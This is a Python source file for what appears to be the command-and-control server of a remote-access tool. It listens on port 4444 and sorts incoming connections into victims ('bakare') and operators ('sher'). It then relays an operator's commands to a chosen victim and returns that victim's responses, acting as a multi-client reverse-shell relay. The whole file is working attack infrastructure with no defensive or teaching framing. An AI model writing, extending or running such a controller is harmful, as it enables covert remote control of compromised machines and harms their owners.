import socket,json
import threading,time

active_bakare={}
active_sher=[]
IP="10.1.185.174"
PORT=4444

def reliable_send(data,connection):
    json_data=json.dumps(data)
    connection.send(json_data.encode("utf-8"))

def reliable_receive(connection):
    json_data=""
    while True:
        try:
            json_data=json_data+connection.recv(1024).decode("utf-8")
            return json.loads(json_data)
        except ValueError:
            continue

def handle_sher(sher_socket):
    while len(active_bakare)==0:
        reliable_send("No bakara is connected\nRefreshing list in 10 seconds",sher_socket)
        time.sleep(10)
    print(active_bakare)
    bakare=list(active_bakare.keys())
    print(bakare)
    reliable_send(bakare,sher_socket)
    n=reliable_receive(sher_socket)
    while True:
        try:
            while len(active_bakare)==0:
                reliable_send("No bakara is connected\nRefreshing list in 10 seconds",sher_socket)
                time.sleep(10)
            command=reliable_receive(sher_socket)
            if command[0]=="change_bakara":
                reliable_send(list(active_bakare.keys()),sher_socket)
                n=reliable_receive(sher_socket)
                continue
            print(n,command)
            print(type(n),type(command))
            reliable_send(command,active_bakare[n])
            reliable_send(reliable_receive(active_bakare[n]),sher_socket)
        except ConnectionResetError:
            try:
                reliable_send("[-] Bakara disconnected",sher_socket)
                active_bakare.pop(n)
            except:
                active_sher.remove(sher_socket)
                break
listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listener.bind((IP,PORT))
listener.listen(5)
print("[+] Waiting for incoming connections")
while True:
    connection,addr=listener.accept()
    print("[+] Got a connection from " + str(addr))
    if reliable_receive(connection)=="sher":
        sher_thread=threading.Thread(target=handle_sher,args=(connection,))
        active_sher.append(connection)
        sher_thread.start()
    else:
        active_bakare[addr[0]]=connection
        